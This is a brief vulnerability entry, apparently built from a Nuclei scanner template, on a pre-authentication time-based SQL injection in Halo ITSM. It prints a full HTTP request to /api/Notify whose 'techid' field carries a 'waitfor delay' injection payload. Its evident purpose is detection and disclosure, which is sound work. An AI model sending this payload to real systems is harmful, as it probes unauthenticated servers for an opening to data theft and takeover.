# Vulnerability: Halo ITSM - Pre-Authentication SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`halo-tism-sqli.yaml`)

## Description
A Time-Based SQL Injection vulnerability in Halo ITSM allows unauthenticated attackers to execute malicious SQL queries by leveraging time delays, potentially leading to data exfiltration, privilege escalation, or full system compromise.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
POST /api/Notify HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
  "sessionid": "{{randstr}}",
  "tracking0": "{{string}}",
  "techid": "1;waitfor delay '0:0:6'--",
  "pickuptime": "2025-03-03T10:00:00",
  "lastactiontime": "2025-03-03T10:00:00",
  "chatlog": "{{randstr}}"
}
```

